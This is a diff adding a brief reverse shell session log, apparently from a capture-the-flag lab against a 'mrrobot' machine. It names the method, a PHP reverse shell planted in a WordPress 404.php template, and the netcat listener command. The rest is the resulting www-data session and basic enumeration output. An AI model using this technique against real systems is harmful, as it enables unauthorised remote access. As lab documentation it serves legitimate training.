@@ -1,0 +1,25 @@
+# Reverse Shell Access Log
+# Target: 192.168.254.133
+# Attacker: 192.168.254.131 (Kali)
+# Method: PHP Reverse Shell via WordPress 404.php Template
+# Shell Type: /bin/bash
+# Listener: Netcat (nc -lvnp 4444)
+
+[+] Received connection from 192.168.254.133:4444
+Linux mrrobot 3.13.0-55-generic #94-Ubuntu SMP x86_64 GNU/Linux
+
+www-data@mrrobot:/var/www/html$
+
+whoami
+www-data
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+pwd
+/var/www/html
+
+hostname
+mrrobot
+
+[+] Initial shell obtained.
